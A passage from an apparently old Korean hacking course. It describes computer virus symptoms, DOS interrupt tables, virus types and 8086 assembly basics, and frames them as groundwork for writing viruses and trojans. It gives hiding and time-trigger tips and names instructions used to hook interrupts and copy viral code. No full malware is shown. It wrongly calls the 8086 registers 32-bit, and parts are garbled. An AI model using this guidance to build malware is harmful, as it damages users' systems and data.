 세이하 바이러스의 경우 은폐형으로볼 때 대부분 은폐형 하면 길이증가를 숨기는 것인데 이것은 그것을 만족하지 못한다. 그리고, 암호화 바이러스도 일부만을 암호화 시키는 바이러스의 경우 암호화라고 보아야 하는지도 논란의 여지가 있다. Meihua의 경우Int 1h을 가로채 조금씩 실행하면서 바이러스중 일부 암호화된 부분을 푼다 

------------------------------------------------------------------------ 

8. 컴퓨터 바이러스 침입에 따른 진단과 양상 

컴퓨터 바이러스가 침입했는지의 여부를 알아낸다는 것은 어떤 면에서 이미 피해가 발생한 후에 침입 사실을 알아차리게 되는 것과 같다. 다음의 일반적인 증상으로 체크해보자 

* 정상적으로 작동하던 프로그램이 갑자기 실행이 안된다. 

* 평소 요구하지 않던 메모리를 요구한다. 

* 프로그램 실행 속도가 느려진다. 

* 이상한 에러 메시지가 나타난다. 

* 디스크의 남은 용량이 감소한다. 

* 화일의 작성 날짜가 변한다. 

* 갑자기 자주 디스크 엑세스를 한다. 

* 시스템이 이유도 없이 다운(DOWN) 된다. 

* 화일이 이유도 없이 사라지거나 늘어난다. 

* 디렉토리가 엉망으로 엉켜 버린다. 

* 정상적이던 디스크에 불량 섹터가 속출한다.

* 시스템 영역이 파괴되었는지 갑자기 부팅이 안된다. 

* 컴퓨터 사용시 이상한 음악이나 삑 소리등이 울린다. 

* 메모리 상주 프로그램이 에러가 생기거나 거부당한다. 

대충 위와 같은 증상들이 바이러스의 대표적인 것이다. 이외에도 여러 증상이 나타날수 있을 것이다. 다음의 여러 양상들을 자세히 살펴보기 바란다. 

1) 컴퓨터 바이러스에 의한 시스템 정지 

비행기를 보면 블랙박스라는 것이있다. 이는 비행기 운항에 대한 전반적인 데이타를 안전하게 저장했다가 사고가 났을때 분석하기 위함이다. 이것은 컴퓨터에도 적용될 수 있는 이야기이다.
 몇몇 기종의 컴퓨터는 SYSLOG라는 화일에 이런 정보를 담고있다. 바이러스가 침입해 시스템을 망가트렸다면 시스템 오퍼레이터는 이를 분석해 원인을 찾을것이다.그러나 MS-DOS를 사용하는 일반적인 컴퓨터에는 기본적으로 이런 역할을 하는 화일이 존재하지 않는다.
 시스템이 파괴되는 원인(일반적으로 정지)으로는 첫째, 프로그램과 시스템간의 결함에 의한 다운(DOWN)이다. 둘째, 컴퓨터 바이러스 프로그램 자체내의 버그(오류)로 인한 발생이다. 마지막으로 가장 치명적인 것이 컴퓨터 바이러스의 고의적 시스템 정지이다. 이를 구체적인 증상으로 살펴보면 키보드를 통한 입력이 정지당하는 것이나 모니터 출력의 변화 그리고 잡음 출력등으로 들 수 있겠다.
 이럴경우 부팅을 하거나 전원을 끊는수밖에 없다. 바이러스에 의한 것이라면 이런 현상은 지속적일 수 있어서 문제이다. 더우기 부팅을 했지만 CMOS 셋업이 풀려버렸거나 시스템 영역의 파괴로 컴퓨터가 정상적으로 작동하지 않는 경우는 복구에 많은 시간을 필요로 한다. 

2) 컴퓨터 바이러스에 의한 하드웨어 파괴가능성 

소프트웨어적으로 하드웨어를 파괴한다면 믿지 못하는 사람들도 많다. 하지만 이것은 충분히 가능한 일이다. 필자가 알고있는 어떤 분은 이런 프로그램을 만들어 모니터나 마더보드를 태워버릴수 있다고 자랑하기까지 했으니 말이다. 대부분의 하드웨어는 이런 소프트웨어적인 잘못된 명령에 대비하고 있으나 그렇지 않은 경우도 있다는 것을 알아두기 바란다.
 일반적인 하드웨어 파괴의 예를 들면, 디스크에 명령을 주어 존재하지 않는 내부 트랙으로 이동하라는 콘트롤러 명령을 준다면 헤드는 안쪽으로 꽉 끼어서 움직이지 않는 JAM 현상이 발생한다. 이 경우 번거롭지만 손으로 직접 해결해야만 한다. 이와 유사한 방법으로 프린터에 "페이퍼 잼(종이 낌)" 현상을 유도할수도 있다.
 그리고 하드 디스크의 마스터 부트 섹터(Master Boot Sector)를 지우는 바이러스이다. 이 경우 포맷을 한다해도 다시 사용할수는 없다. 이외에도 단지 config.sys에 변형을 가해 엄청난 수의 하드 디스크 억세스를 실행시켜 하드 마모를 가져오는 경우도 있다. 

3) 컴퓨터 바이러스에 의한 에러조작 정상적인 시스템과 운영환경임에도 불구하고 단지 에러인척 조작하는 바이러스도 있다. 사용자는 단지 화면에 뜨는 메시지와 스피커를 통해 나오는 잡음만으로 시스템에 이상이 생긴걸로 판단해 버리는 경우가 있다. 다음은 초기 시절 소프트웨어 제작사들이 무단복제를 막기위해 화면에 내보내는 메세지 중 하나이다.
 Internal error number : 084 876 at position pc 586 please notify the manufacturer 이럴경우 아무 이상이 없지만 불법복제 사용자의 경우는 지레 겁을 집어먹게된다. 이런 방법을 컴퓨터 바이러스 제작자들이 모를리가 없다. 그리하여 나온 것이 "Rush Hour" 바이러스이다.
"러쉬아워" 바이러스는 단지 키가 눌려질때마다 소리를 내어 사용자가 짜증을 내며 이상이 있는 것처럼 유도만 한다. 이 외에 하드디스크에 배드섹터가 있는것처럼 보이게 한다거나 특정회사가 이런 에러를 유발시켜 새로운 구매를 이끌어 내는 경우도 있다. 

4) 컴퓨터 바이러스에 의한 데이타 조작 컴퓨터의 하드웨어를 파괴하는것은 물리적인 것이기에 다시 수리하거나 새로 구입하면 된다. 그러나 소프트웨어적인 데이타를 파괴하거나 변경시켜 버린다면 그 피해는 상상하기 어렵다.
 고객명단이 수록된 데이타베이스에 바이러스가 침투하여 엉뚱하게 바꾸어 버리거나 수년간 막대한 연구비를 투자하여 제작한 프로젝트가 순식간에 날아가버릴수도 있다.데이타를 전부 삭제하는것보다도 부분적인 변형을 가한것이 더 찾기 힘들뿐만 아니라 오류를 지닌채 출력을 하므로 더 악질적이다. 은행 시스템에 바이러스가 침투하여 그날 출금 자리숫자를 변형시킨다면 엄청난 혼란이 초래될것이다.일일이 찾아서 수정하기도 결코 쉽지가 않을것이다. 데이타 오류 추적에 투자되는 시간은 곧 돈이다. 

5) 컴퓨터 바이러스에 의한 시스템 실행 시간 가로채기 컴퓨터 바이러스에 의한 문제점은 굉장히 다양하다. 그 중 컴퓨터 바이러스가 시스템에 침투해 일으키는 문제로서 시스템 수행 시간을 가로채는 것이있다. 바이러스는 컴퓨터의 주메모리에 침투해 있다가 메모리로 들어와 처리되는 프로그램들의 시간을 가로채서 시스템을 느리게 만들고 능력을 저하시킨다. 이외에 부당한 시스템 엑세스를 요구하는 바이러스도 존재한다. 네트워크를 통해 메인 프레임에 침투한 바이러스는 제작자가 명령한 대로 자신을 복제하고 특정 시간이 될 경우 메인 프레임에 억세스할 권한을 바이러스 제작자에게 넘겨준다. 메인 프레임이 감염될 경우 부당한 사용자가 시스템을 조종하여 파괴할수도 있고 접속해오는 사용자들에게 바이러스를 전파할수도 있다. 

------------------------------------------------------------------------ 

9. 오퍼레이팅 시스템(Operating System)와 컴퓨터 바이러스 

컴퓨터는 운영체제에 의해 작동한다. 컴퓨터 바이러스의 대부분은 이런 운영체제를 교묘히이용한다.컴퓨터 운영체제에는 인터럽트라는 중요한것이 있다.인터럽트란 하드웨어적인것과 소프트웨어적인 것으로 구분하는데 하드웨어적인것은 하드웨어에서 발생하는 각종 신호들을 가리키며 소프트웨어적인 것은 프로그램이 진행하면서 발생하는 신호를 말한다.
 CPU는 컴퓨터 작업도중 발생하는 신호들을 조화롭고 효율적으로 처리해주는 것이다. 이러한 인터럽트의 기능 호출은 컴퓨터 바이러스에게 역으로 공격할 소지를 남겨준다. 적을 알고 나를 알면 승리한다했다. 가장 널리 쓰는 MS-DOS의 인터럽트에 대해 알아보자.MS-DOS는 단일 운영체제로서 세계 약 1억명의 사용자를 가지고있다. 그렇기에 바이러스의 수도 엄청나게 존재한다. MS-DOS의 시스템은 인터럽트를 통해 어셈블리에 접근한다. 이 인터럽트는 'INT'라는 어셈블리 명령어로 호출된다. 인터럽트 리스트와 그 기능에 대해 알아보자. 

인터럽트 번호 작업 00 Division 01 Single step 02 NMI 03 Brakepoint 04 Overflow 05 Print screen 06 사용 안함 07 사용 안함 08 Timer 09 Keyboard 0A 사용 안함 0B AUX port COM1 0C AUX port COM2 0D Hard Disk Controller 0E Floppy Disk Controller 0F Printer 10 SCREEN 11 HARDWARE CHECK 12 GET MEMORY SIZE 13 DISK READ/WRITE(SECTOR) 14 AUX READ/WRITE 15 CASSETTE 16 KEYBOARD 17 PRINTER 18 BASIC ROM 19 BOOT STRAP 1A TIME 1B KEYBOARD BREAK 1C TIMER 1D SCREEN INIT 1E DISK PARAMETER ADDRESS 1F ASCII SET ADDRESS 


실제 시스템 인터럽트는 20H 부터이다. 20 TERMINATE PROGRAM 21 DOS FUNCTION CALL 22 TERMINATE ADDRESS 23 CTRL C HANDLER ADDRESS 24 CRITICAL FAILURE ADDRESS 25 ABSOLUTE DISK READ 26 ABSOLUTE DISK WRITE 27 TERMINATE/REMAIN RESIDENT 28 DOS INTERNAL - 3F 40 RESERVED FOR EXPANSION - 5F 60 USER INTERRUPTS - 7F 80 BASIC INTERRUPTS - 85 86 BASIC INTERPRETER INTERRUPTS - F0 F1 사용 안함 - FF 시스템 


인터럽트중 주목할것이 21H이다. 21H는 특별한 역할을 하는것으로서 이것을 사용하기 위해서는 인터럽트 실행전 아래 값들 중에 하나를 AH에 넣어 주어야 한다. 그러면 다음의 펑션들을 사용하게된다. 

AH 번호 기능(function) 00 TERMINATE PROGRAM 01 READ KEYBOARD AND ECHO 02 DISPLAY CHARACTER 03 AUXILIARY INPUT 04 AUXILIARY OUTPUT 05 PRINT CHARACTER 06 DIRECT CONSOLE I/O 07 DIRECT CONSOLE INPUT 08 READ KEYBOARD 09 DISPLAY STRING 0A BUFFERED KEYBOARD INPUT 0B CHECK KEYBOARD STATUS 0C FLUSH BUFFERS/READ KEYBOARD 0D FLUSH BUFFERS/DISK RESET 0E SELECT DISK 0F OPEN FILE 10 CLOSE FILE 11 SEARCH FOR FIRST ENTRY 12 SEARCH FOR NEXT ENTRY 13 DELETE FILE 14 SEQUENCIAL READ 15 SEQUENCIAL WRITE 16 CREATE FILE 17 RENAME FILE 18 MS-DOS INTERNAL 19 GET CURRENT DISK 1A SET DISK TRANSFER ADDRESS 1B MS-DOS INTERNAL 1C MS-DOS INTERNAL 1D MS-DOS INTERNAL 1E MS-DOS INTERNAL 1F MS-DOS INTERNAL 20 MS-DOS INTERNAL 21 RANDOM READ 22 RANDOM WRITE 23 GET FILE SIZE 24 SET RELATIVE RECORD 25 SET INTERRUPT VECTOR 26 CREATE NEW PROGRAM SEGMENT 27 RANDOM BLOCK READ 28 RANDOM BLOCK WRITE 29 PARSE FILE NAME 2A GET DATE 2B GET TIME 2C SET TIME 2E SET/RESET VERIFY FLAG 2F GET DISK TRANSFER ADDRESS 30 GET DOS VERSION NUMBER 31 TERMINATE/REMAIN RESIDENT 32 MS-DOS INTERNAL 33 CTRL-C CHECK 34 MS-DOS INTERNAL 35 GET INTERRUPT VECTOR 36 GET DISK FREE SPACE 37 MS-DOS INTERNAL 38 GET COUNTRY INFORMATION 39 CREATE SUB-DIRECTORY 3A REMOVE DIRECTORY 3B CHANGE CURRENT DIRECTORY 3C CREATE FILE/HANDLE 3D OPEN FILE/HANDLE 3E CLOSE FILE/HANDLE 3F READ FROM FILE/DEVICE 40 WRITE FROM FILE/DEVICE 41 DELETE FILE 42 MOVE READ/WRITE POINTER 43 CHANGE ATTRIBUTES 44 I/O CONTROL FOR DEVICE 45 DUPLICATE FILE HANDLE 46 I/O REDIRECTION 47 GET CURRENT DIRECTORY 48 ALLOCATE/LOCK MOMORY 49 UNLOCK MEMORY 4A MODIFY ALLOCATE MEMORY 4B LOAD/EXECUTE PROGRAM 4C TERMINATE PROCESS (ERROR) 4D GET CHILD'S RETURN CODE 4E FIND MATCH FILE 4F FIND NEXT FILE 50 MS-DOS INTERNAL 51 MS-DOS INTERNAL 52 MS-DOS INTERNAL 53 MS-DOS INTERNAL 54 RETURN VERIFY FLAG 56 MOVE FILE (RENAME) 57 GET/SET FILE TIME & DATE 58 GET/SET ALLOCATION STATUS 59 GET EXPAND ERROR CODE 5A GERNATE TEMPORARY FILE 5B CREATIVE FILE 5C OPEN/CLOSE FILE ACCESS ABILITY 5E GET INFORMATION OF DEVICE 


위에서 소개한 것들은 컴퓨터 바이러스를 제작할 수 있는 모든 조건들을 제공해준다. 제작자는 단지 적절히 골라서 사용하기만 하면 된다. 

------------------------------------------------------------------------ 


10. 컴퓨터 바이러스의 종류와 특징 

바이러스는 그 종류도 다향하고 양상도 각각이다.컴퓨터 바이러스는 특별히 정의를 내리기도 어려울 뿐더러 분류에도 어려움이 있다. 

1) 보편적인 바이러스 분류 

A. Overwriting VIRUS 

원래 화일을 파괴하기 위해 덮어쓰는 형태의 바이러스이다. 가장 간단한 형태지만 바이러스의 모든 특성을 지니고있다. 일단 실행되면 디스크의 모든 화일들을 지운다. 그러므로 쉽게 눈에 띈다. 

B. Non-Overwriting VIRUS 

이 바이러스는 화일의 원형을 그대로 보존하기에 발견이 쉽지 않을뿐더러 덮어쓰는 바이러스보다 더 위험하다. 이유는 덮어쓰는 형태의 바이러스는 쉽게 눈에 띄기 때문에 전파력이 약하다. 엄밀히 말해 바이러스의 위험도는 파괴력보다 숨어있는것이 더 무섭기 때문이다. 

C. Memory 상주 VIRUS 

메모리 상주형 바이러스는 전파속도와 감염도에서 가장 뛰어나다. 이 바이러스가 메모리에 침투하면 메모리에서 상주하여 있으면서 메모리로부터 읽어들이는 모든 화일이나 디스켓등에 감염을 시킨다. 컴퓨터가 꺼지는 순간까지 이 바이러스는 살아있을 것이다. 

D. Calling VIRUS 

위의 바이러스들은 모두 그 크기가 크다. 그렇기에 발견될 위험도도 그만큼 크다. 그래서 calling 형 바이러스는 화일의 속성변환 등을 통해 눈에 안띄게 되어 있다. 감염시에만 바이러스 프로그램을 호출하는 명령어만을 화일에 써넣는다. 사용자들의 눈을 속여 쉽게 발견되기 어렵다. 

2) 그외의 컴퓨터 바이러스 분류 

A. 트로이 목마형 & 시한폭탄형 바이러스 

트로이목마는 고대 희랍에서 유래된말로 상대의 맘에 들게 만들어 그것을 취하면 피해를 입히는 미끼라고 할수 있다. 즉, 트로이목마형 바이러스를 만들면 트로이목마 바이러스는 제작자가 의도한 방향대로 작동할 것이다. 단, 프로그램이 생명이 있는것도 아닌데 그냥 움직일리 없다. 분명 상대방이 이것을 실행시켜야 한다. 그래서 트로이목마형 바이러스는 화려한 가면을 쓰고있다.최신 게임에 묻어오거나 누구나 한번쯤 실행시켜볼 그런 프로그램들에 감염되어 전파되는것이다. 그 예로 미국의 한 사설비비에스에서 있었던 일이있다. 새로 자료가 등록되었는데, 이름하여 '마돈나 뮤직비디오!' 사람들이 호기심에 무진장 받아갔다. 처음에 실행하니 진짜 마돈나가 나와서 춤추고 노래부른다.
 좀 있다가 화면에 '마돈나를 PC에서 봅니까?'하는 메시지와 더불어 하드가 날라갔다. 트로이목마형의 전형적인 유형이다. 하지만, 이런 방식을 쓰면 트로이 목마를 제작한 사람을 알 수 있고 그 출처도 알 수 있다. 이렇게 되면 전파력이 떨어지고 꼬리가 밟히는것이다. 그래서 좀더 새로운 기술을 원해서 탄생한게 시한폭탄형 (일명 논리형) 바이러스이다.
 자신이 프로그래밍시 입력한 날짜나 시간 혹은 조건이 맞는다면 바이러스가 작동을 하는것이다. 물론, 날짜나 시간, 분, 초 단위까지도 맞추어 놓을수 있으나 월단위로 맞추어 놓는게 가장 확실할것이다. 날짜로 맞추면 그 날짜에 컴퓨터를 사용안하고 거르면 또 한달을 기다리고, 시간도 마찬가지일것이다. 좀 소스가 길어지지만 아예 1월 1일, 3월23일 이런식으로 코딩할수도 있다. 이번달이 2월이면 바이러스에는 한 4월에 작동하라구 타이머를 맞춰두면 어김없이 4월 한달내내 작동한다.
 물론 그때까지 걸리지않구 숨어있어야 하니까 화일 속성을 숨김으로 바꾸어 놓으면 된다.이러한 트로이 목마형 바이러스는 일반적인 프로그램을 가장하고 그 안에는 고의적으로 사용자가 모르는 다른 기능을 포함하고 있으며 자기 복제 기능이 없는 것이 특징이다.트로이 목마형 바이러스를 기존의 바이러스 영역에 넣어야 할것인지에 대해선 논란이 많았다. 몇몇 공식같은 바이러스 특성에 맞추기는 힘들기 때문이다. 하지만 목적과 행동유형이 같으니 엄연한 바이러스 범주에 들어가야 한다. 

B. 벌레 프로그램 

컴퓨터 시스템에는 별다른 영향을 끼치지 않고 자신을 계속 복제하는 프로그램이다. 네트워크 상의 크리스마스 바이러스가 대표적인 예이다. 

------------------------------------------------------------------------ 

11. 컴퓨터 바이러스의 제작 

컴퓨터 바이러스가 실제 어떻게 작동되고 제작되는지에 대해서 알아보자. 프로그래밍 언어별, 바이러스 종류별로 구현된 소스를 게재하여 이해를 돕도록 하겠다. 컴퓨터 바이러스는 대개 어셈블리어로 작동한다. 이유는 어셈블리어가 가장 컴퓨터 시스템에 근접할 수 있는 언어이기 때문이다. 어셈블리어로 제작된 바이러스는 그 크기도 작을뿐더러 속도도 빠르다. 하드웨어 접근에 탁월하기에 컴퓨터 바이러스 제작에 주로 사용된다. 해커라면 어셈블리어는 능숙하게 다룰줄 알아야 하는것은 기본이다. 그러나 어셈블리어만으로 바이러스를 만드는것은 아니다. 베이직, 파스칼, C 언어 더우기 배치(BATCH)화일 로도 프로그래밍을 할 수가 있다. 이렇게 컴퓨터 바이러스 제작기법을 공개하는것은 바이러스의 실체를 낱낱이 알아야 이에 대처할 수 있다는 생각 때문이다. '지피지기면 백전백승'이라는 명언을 생각해보자. 

------------------------------------------------------------------------ 

해킹 강좌 3회 

------------------------------------------------------------------------ 

세번째 강좌입니다. 어셈블리라는게 워낙 방대하다 보니 일일이 서술하기는 힘듭니다. 기본적인 원리 등에 대해 서술하겠습니다. 4,5회 강좌부터는 배치 프로그래밍을 배우며 트로이 목마를 실제 제작해 보겠습니다!! 그럼 기대 하세요!

------------------------------------------------------------------------ 

1. 어셈블리로 구현해본 바이러스 

(1) 마이크로 프로세서 8086/8088 하드웨어의 레지스터 구조

(2) 어셈블러 범용 명령어

(3) 어셈블리 바이러스 실제 구현

------------------------------------------------------------------------ 

1. 어셈블리로 구현해본 바이러스 

프로그래밍 언어를 살펴보면 고급 언어는 프로그램을 작성하기 쉽다, 실행 시간이 길다. 예) BASIC, C, PASCAL 어셈블리어는 프로그램 작성하기 어렵다, 직접적인 하드웨어의 접근이 쉽다, 속도가 빠르다는 장점이 있다 기계어는 프로그램 작성하기가 거의 어렵다, 일부 어셈블리 프로그램시 이용하기도 한다는 특징이 있다.

------------------------------------------------------------------------ 

(1) 마이크로 프로세서 8086/8088

하드웨어의 레지스터 구조 레지스터란 CPU가 컴퓨터를 작동시키는데 필요한 정보를 임시로 저장하는 곳이다. CPU 내부에는 32 bit 크기의 여러가지 레지스터가 있다. 어셈블리언어에서는 이 레지스터를 이름까지 지정하여 선택 사용할 수 있다. 이 여러개의 레지스터는 사용 용도에 따라 범용 레지스터/ 특수 레지스터/ 플래그 레지스터 등으로 나뉜다.
 레지스터의 용도는 16진수의 데이타를 일시적으로 저장한 후 필요한 때 불러내어 쓸 수 있으며 각종 논리/산술 연산결과를 저장하거나 연산의 결과를 판단할 때 사용한다. 또한 프로그램 수행을 위하여 기계어 명령을 읽어 들일 주소를 지정하기도 한다. 
A. 데이타 레지스터 데이터 레지스터는 각종 데이터 처리를 대상으로 한다. 8086/8088 계열의 범용 레지스터는 4가지가 있다. 총 16비트로 이루어져있는데, 16비트 레지스터 및 8비트 레지스터 일부를 프로그래머가 명령 중에서 자유롭게 지정을 할 수 있는 범용 레지스터이다. 범용 레지스터로서의 역활 이외에도 아래에서 설명하는 특정한 역활도 가지고있다.
 이 레지스터들은 사용자가 데이타를 조작하는데 자주 필요한 것들이다. 레지스터들의 기본적인 의미는 프로그래머가 임의로 무시할수 있다. 
- AX : 어큘레이터 레지스터라고도 하며 연산 레지스터로서 하며 연산의 결과나 중간 값등을 저장하는데 쓰인다. AH는 AX의 상위 8비트를 AL은 AX의 하위 8비트를 가리킨다. 연산기능이 다른 것보다 조금 많은 레지스터이다.
 - BX : 베이스 레지스터라고도 하며 베이스 어드레스 지정에 쓰인다. 간접 어드레스 지정시에 어드레스 레지스터, 트랜슬레이터 명령에 있어서 변환 테이블, 베이스 레지스터로서 사용한다.
 - CX : 카운터 레지스터라고도 하며 반복 실행문의 반복 횟수를 지정할때 쓰인다.
 - DX : 데이터 레지스터라고도 하며 어큘레이터의 보조로 활용되거나 간접 어드레스에 의한 입출력 명령시 어드레스 지정에 사용된다. 곱셈, 나눗셈 작업을 할 때 사용된다.

 B. 포인터 레지스터와 인덱스 레지스터 
- BP : 베이스 포인터 레지스터이다. 기본적으로 스택 영역내 어드레스를 지시하지만 스택 세그먼트 SS 영역내에 배치한 데이타에 대한 베이스 어드레스의 위치 지정에 사용된다.
 - SI : 소스 인덱스 레지스터이다, 오퍼랜드 소스, 소스 데이터를 어드레스 지정에 사용한다.
 - DI : 데스티네이션 인덱스 레지스터이다. 오퍼랜드의 처리 대상 또는 데스티네이션 데이타를 나타내는데 사용된다.
 - SP : 스택포인터 레지스터라고 불린다. 메모리에서 스택의 위치를 펴시한다. 스택 맨 위의 주소를 담고 있다.

 C. 세그먼트 레지스터 세그먼트 레지스터는 B버스 인터페이스 유닛에 달려 있는 레지스터이다. 메모리를 효과적으로 사용 가능하게 해준다. 
- CS : 코드 세그먼트 레지스터이다. 실행형 프로그램 코드가 들어있는 메모리 주소를 지정한다.
 - DS : 데이타 세그먼트 레지스터이다. 프로그램 수행후 데이타가 들어있는 메모리 주소를 지정한다.
- SS : 스택 세그먼트 레지스터이다. 스택의 시작 주소를 담고 있다.
 - ES : 확장 세그먼트 레지스터이다. 데이타 세그먼트의 확장으로 쓸수 있다. 확장 세그먼트의 시작 주소를 담고 있다.

 D. 플래그 레지스터 플래그 레스터 상태
 표. 상 위 │ 하 위 │ 15 14 13 12 11 10 ９ ８│７ ６ ５ ４ ３ ２ １ ０ 

┌─┬─┬─┬─┬─┬─┬─┬─┼─┬─┬─┬─┬─┬─┬─┬─┐ │×│×│×│×│Ｏ│Ｄ│Ｉ│Ｔ│Ｓ│Ｚ│×│Ａ│×│Ｐ│×│Ｃ│ └─┴─┴─┴─┴─┴─┴─┴─┼─┴─┴─┴─┴─┴─┴─┴─┘ 


오 디 ↑ 트│사 제 보 패 캐 버 렉 ↑ 랩 인 로 조 리 리 플 션 ↑ 티 로 ↑ 케 우 


인터럽트 인에이블 리 ( 세트 = 1 , 리셋 = 0 ) 
- TF : 추적 플래그이다. 명령어가 1개씩 실행되기에 프로그램의 에러 추적등에 사용할수 있다. 프로세서를 프로 그램 디버거용의 싱글 스테프 모드 아래 놓는다.
 - IF : 인터럽트 인에이블 플래그이다. 외부 인터럽트를 Inable 또는 Disable한다. 외부 인터럽트의 허락을 결정한다.
 - DF : 디렉션 플래그이다. 스트링처리에서 방향을 결정하기에 자동 증가나 감소가 이루어 진다. 스트링 명령에서의 실행방향 자동 인크리먼트 또는 디크리먼트 조작을 제어 한다.
 - CF : 캐리플래그이다. 2바이트 이상의 가감산에 이용하고 최상위비트에서 자리올림 또는 그자리에서의 자리올림을 표시한다. - PF : 패리티 플래그이다. 데이터 전송이나 연산시에 짝수 패리트를 검사해 준다. 
- AF : 보조 캐리 플래그이다. 4비트에서 5비트로 자리올림을 표시해 준다.
 - ZF : 제로 플래그이다. 연산에서 자주 쓰인다. 연산 결과가 0이면 1이라고 표시해 준다.
 - SF : 부호 플래그이다. 부호를 표시해 준다. 오퍼레이션의 결과,최상위 비트가 1일때 세트된다. 0=정,1=부의 부호를 표시한다.
 - OF : 오버플로우 플래그이다. 산술연산 결과의 오버플로우 상태를 표시한다.
 - IP : 명령 포인터 레지스터이다. 현재 실행중인 명령의 위치를 가리킨다. *간단한 사용예. mov ax, bx ☞ bx 를 ax 에 넣어라 (bx 값이 없어지고 ax로 가는 것이 아니라 ax 에 bx값이 복사된다고 생각하면 된다) inc cx ☞ cx 값을 하나 증가시켜라. ( C 에서는 cx++ 와 같은 의미이며 cx 가 FFFF 이면 증가 시키면 0000 값이 된다) add dx, si☞ C 에선 dx += si 와 같은 의미이며 dx 와 si를 더한 결과를 다시 dx에 집어넣는 명령 shl bx, cl ☞ C 에선 bx<

------------------------------------------------------------------------ 


(2) 어셈블러 범용 명령어 

기본적이고 자주쓰는 어셈블러 명령어들을 모아보았다. 이 정도만 알고 있어도 어셈블리 언어로 제작된 바이러스 소스는 알아볼수 있을것이다. 좀 더 자세한것은 어셈블러 자료를 보기 바란다. 이곳에서 어셈블러를 다 설명할 수는 없기 때문이다. 

MOV : 어셈블러에서 가장 많이 사용하는 명령어이다. 필요한 정보를 이동 시키는 명령어이다. 

PUSH : 저장할 레지스터 (SAVE) 

POP : 환원시킬 레지스터 (LOAD) 

ADD : 덧셈을 가능하게 해준다. 2개의 오퍼랜드 덧셈을 실행하고,그 결과를 제 1 오퍼랜드에 집어넣는다 

SUB : 뺄셈을 가능하게 해준다. 데스티네이션 오퍼랜드에서 소스 오퍼랜드를 빼고, 그 결과를 제 1 오퍼랜드에 넣는다.

MUL : 곱셈을 가능하게 해준다. 첫번째 오퍼랜드는 항상 AX(16비트 연산)와 AL(8비트 연산)을 사용한다. 곱셈 작업 연산 결과가 32비트인 경우에는 DX:AX에, 16비트인 경우에는 AX에 항상 저장된다. DIV : 나눗셈을 가능하게 해준다. 

CMP : 비교연산 명령어이다. CMP는 비교 연산작업에 필수적인 명령어로서 중요한 명령어이다. 고급 언어의 IF∼THEN 과 같은 형식이다.

INC, DEC : 증감 명령어이다. 이 명령은 순환문, 반복문 등에서 반복 횟수등을 제어한다. JMP : 고급 프로그래밍 언어에서의 GOTO 명령과 같은 점프작업을 한다. 원거리, 근거리 점프와 조건적, 무조건적 점프로 구분할 수 있다. 

* 바이러스에 많이 나오는 명령들 PUSH AX(BX,CX,DX...) : 거의 모든 프로그램에서 나오는 명령인 레지스터 저장이다. 

Int 21 : 인터럽트 21인 기능은 호출이다. 보통의 램 상주 바이러스 자신임을 나타낼 독특한 값을 사용한다. 예로 방랑자 변종들은 MOV AX,F060 부터 시작하는데 나중으로 갈수록 61,62 등으로 바뀌고 램에 존재하면 AX 에 0000 이 들어온다.

MOV BX,ES : MCB 위치를 구하는 것이다. 

DEC BX : 램에 상주하는 바이러스들에서 사용한다. REPZ MOVSB : DS:[SI] 값을 ES:[DI] 로 복사하는 것이다. 보통 바이러스 자신을 복사하거나 할때 사용된다..

CLI,STI : 이명령이 없이 직접 인터럽트를 바꾸면 정지할수가 있다. 파일 바이러스에서 많이 가로채는 AH 번호들 3D,43,4B,56,41,3C,3E 등이다. 

AND AL,DF : 이것은 대문자로 바꾸는 것입니다. 즉, ASC값에서 소문자일경우 대문자가 되는것입니다 MOV AX,3524 : Int 24h 는 에러처리 부분이다. 즉, 쓰기 방지 INT 21 등의 디스크에서는 감지시 에러가 발생하는데 이것을 바이러스가 가로채서 화면에 아무런 말도 나오지 않게 한다. CALL FAR [0008] : 인터럽트를 호출한다. 

RET 4E,4F : 주로 비상주형 바이러스들이 많이 사용한다. 파일을 찾을때 사용된다. 

*간단한 소스 와 의미 분석 어셈블 소스 기계어(Opcode)

─────────────┼───────── mov  ax, 1234H│B8 34 12

┬─ ┬ ┬─ │ │ └─ operand#2 (source:값의 출처) │ └─── operand#1 (destination:값이 들어갈 방) └─────── mnemonic (명령어에 해당되는 짧은 기호) 

<소스로 본 의미> 

mov : operand#2를 operand#1에 넣으라는 의미 ax : ax라는 이름의 16bit 레지스터를 가리킴 1234H : 실제 value 위의 명령을 수행하면 16 bit값 1234H가 ax 로 대입된다. <기계어(Opcode)로 본 의미> B8 : 바로뒤의 두바이트를 ax에 넣으라는 의미 34 12 : 1234H 의 하위 바이트 값이 먼저 온다는 것에 주의 !!!
 명령어의 구조 .명령어의 세분 : Mnemonic, operand#1, operand#2, operand#3 mov ax, 1234H ; ';' 이후로 한줄의 끝 까지는 comment ┬─ ▲ ─┬─ │ │ │ 데이타의 이동은 항상 맨 앞이 들어갈 방이고 뒤는 │ └───┘ 나오는 방이다. │ └─ 니모닉(Mnemonic) : 사람이 알아보기 편하고 쓰기 편한 약어이다. 옮기다는 뜻을 가진 move에서 'e' 를 뗀 형태이다. Mnemonic 다음에는 보통 하나 또는 두개의 operand가 따라오는데 명령의 종류에 따라 오퍼랜드 갯수는 0 - 3 개 까지 다양하다. operand에는 여러가지 형태가 존재한다. Immediate value(즉치값), register (레지스터), memory(메모리에 있는 값) 들이 있으며 크기도 1 비트에서 10 바이트 까지 여러 크기가 있다.
 operand#1의 종류와 operand#2의 종류는 여러 가지 조합을 가질 수 있으나 몇가지 사용할 수 없는 조합이 있다. 
첫째 : operand#1은 Immediate value가 될 수 없다.
 둘째 : cbw, cwd 등의 경우같은 특수 명령을 제외하고는 양쪽의 크기는 같아야 한다. * DOS FUNCTION CALL 입출력 등의 루틴을 하나 하나 작성하려면 굉장히 많은 노력이 든다. 이와 같이 많이 쓰이는 기본적인 루틴들을 시스템에 만들어 놓고, 시스템 이용자가 자유롭게 사용할 수 있게 해놓았다. 이것을 사용하기 위한 방법이 시스템 호출 (SYSTEM CALL)이다. MS-DOS에서는 주로 인터럽트 21H (INT 21H)를 사용하고 그중에서 서브 COMMAND를 설정한다.
